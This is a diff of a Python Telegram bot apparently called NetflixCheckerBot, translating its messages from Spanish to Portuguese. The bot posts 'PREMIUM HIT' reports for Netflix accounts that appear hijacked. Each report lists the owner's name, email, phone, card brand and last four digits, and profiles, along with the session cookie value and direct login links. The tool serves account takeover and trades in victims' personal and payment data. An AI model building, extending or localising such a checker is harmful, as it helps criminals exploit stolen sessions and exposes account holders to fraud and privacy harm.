                 await update.message.reply_text("❌ Formato no reconocido.\nUse /help para ayuda.")
 
@@ -533,22 +482,22 @@ class NetflixCheckerBot:
             f"<b>╔══════════════════════════════════════╗</b>\n"
             f"<b>║     🎬 NETFLIX PREMIUM HIT           ║</b>\n"
             f"<b>╚══════════════════════════════════════╝</b>\n\n"
-            f"<b>👤 Nombre:</b> {acc['name']}\n"
+            f"<b>👤 Nome:</b> {acc['name']}\n"
             f"<b>📧 Email:</b> <code>{acc['email']}</code>\n"
             f"<b>🌍 País:</b> {acc['country']} {flag} ({cc})\n\n"
             f"<b>╭─────────────────────────────────╮</b>\n"
             f"<b>│  📋 {acc['plan']}  •  💰 {acc['price']}</b>\n"
             f"<b>│  📅 Desde:</b> {acc['member_since']}\n"
-            f"<b>│  🗓 Próximo cobro:</b> {acc['next_billing']}\n"
-            f"<b>│  🎁 Trial:</b> {'Sí' if acc['free_trial'] else 'No'}\n"
+            f"<b>│  🗓 Próxima cobrança:</b> {acc['next_billing']}\n"
+            f"<b>│  🎁 Trial:</b> {'Sim' if acc['free_trial'] else 'Não'}\n"
             f"<b>╰─────────────────────────────────╯</b>\n\n"
             f"<b>╭─────────────────────────────────╮</b>\n"
-            f"<b>│  🎥 Calidad:</b> {acc['video_quality']}\n"
-            f"<b>│  📺 Pantallas:</b> {acc['max_streams']} simultáneas\n"
+            f"<b>│  🎥 Qualidade:</b> {acc['video_quality']}\n"
+            f"<b>│  📺 Telas:</b> {acc['max_streams']} simultâneas\n"
             f"<b>│  ➕ Extra:</b> {acc['extra_slots']}\n"
-            f"<b>│  💳 Tarjeta:</b> {acc['card_brand']} ****{acc['card_last4']}\n"
+            f"<b>│  💳 Cartão:</b> {acc['card_brand']} ****{acc['card_last4']}\n"
             f"<b>│  📞 Tel:</b> {acc['phone']}  {pv}\n"
-            f"<b>│  👥 Perfiles:</b> {acc['profile_count']} ({profs})\n"
+            f"<b>│  👥 Perfis:</b> {acc['profile_count']} ({profs})\n"
             f"<b>╰─────────────────────────────────╯</b>\n\n"
             f"<b>🍪 Cookie:</b>\n<code>{cookie_val[:100]}</code>\n\n"
             f"<b>👨‍💻 {DEVELOPER}</b>"
@@ -559,7 +508,7 @@ class NetflixCheckerBot:
         if acc.get("login_pc") and acc["login_pc"] != "N/A":
             row1.append(InlineKeyboardButton("🖥 PC", url=acc["login_pc"]))
         if acc.get("login_phone") and acc["login_phone"] != "N/A":
-            row1.append(InlineKeyboardButton("📱 Móvil", url=acc["login_phone"]))
+            row1.append(InlineKeyboardButton("📱 Phone", url=acc["login_phone"]))
         if row1: buttons.append(row1)
         buttons.append([InlineKeyboardButton("📺 TV", url=acc["login_tv"])])
         markup = InlineKeyboardMarkup(buttons)
@@ -570,11 +519,9 @@ class NetflixCheckerBot:
         await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)
 
     def run(self):
-        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ACTIVO - ADMIN PROTEGIDO - PROXIES ACTIVOS")
+        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO")
         self.app.run_polling()
 
 if __name__ == "__main__":
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
     bot = NetflixCheckerBot(BOT_TOKEN)
     bot.run()
